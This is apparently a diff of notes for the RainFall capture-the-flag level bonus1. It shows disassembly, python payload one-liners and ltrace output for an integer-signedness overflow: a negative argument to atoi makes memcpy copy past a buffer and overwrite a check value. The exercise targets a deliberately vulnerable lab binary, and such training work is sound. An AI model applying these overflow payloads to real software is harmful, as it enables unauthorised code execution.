@@ -1,8 +1,12 @@
+We can overflow the <atoi> function with a large negative number to overwrite the value of <n> to match the value of 0x574f4c46
+which gives us access to the system call
+
+
 0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
    0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
    0x08048446 <+34>:	jle    0x804844f <main+43>
 
-== first arg < 9 
+== first arg < 9
 
 
 /bonus1 8  `python -c 'print "A"*40 + "BBBB"'`
@@ -13,15 +17,15 @@ memcpy(0xbffff6f4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 32)             = 0xbf
 
 ok
 
-then with -1 
+then with -1
 bonus1@RainFall:~$ ltrace ./bonus1 -1  `python -c 'print "A"*40 + "BBBB"'`
 __libc_start_main(0x8048424, 3, 0xbffff7b4, 0x80484b0, 0x8048520 <unfinished ...>
 atoi(0xbffff8e8, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                     = -1
-memcpy(0xbffff6e4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4294967292 <unfinished ...> <<<---- :o intMax -1 
+memcpy(0xbffff6e4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4294967292 <unfinished ...> <<<---- :o intMax -1
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 
-seems like -1073741810 == 56 
+seems like -1073741810 == 56
 
 bonus1@RainFall:~$ ltrace ./bonus1 -1073741810 `python -c 'print "A"*40 + "BBBB"[::-1]'`
 __libc_start_main(0x8048424, 3, 0xbffff7b4, 0x80484b0, 0x8048520 <unfinished ...>
